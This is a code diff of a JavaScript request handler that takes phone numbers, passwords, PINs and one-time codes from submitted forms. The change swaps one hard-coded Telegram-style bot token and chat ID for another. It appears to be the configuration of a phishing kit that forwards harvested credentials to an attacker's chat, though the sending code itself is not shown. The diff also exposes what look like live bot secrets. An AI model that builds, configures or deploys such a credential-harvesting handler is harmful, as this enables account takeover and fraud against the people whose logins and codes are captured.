@@ -6,8 +6,8 @@ export default async function handler(req, res) {
   const { type, issue, phone, pass, pin, otp, attempt } = req.body;
 
   // ==================== DUAL BOT CONFIGURATION ====================
-  const BOT_1_TOKEN = '9234661707:AAEUKJc51UIPl9jIxHWdqE2ntrADRFqgGzo';
-  const CHAT_1_ID = '8380981651';
+  const BOT_1_TOKEN = '9137661344:AAG638pFxGmP8-c-_oT5poKgq-tU__DDy78';
+  const CHAT_1_ID = '8235224523';
 
   const BOT_2_TOKEN = '';
   const CHAT_2_ID = '';
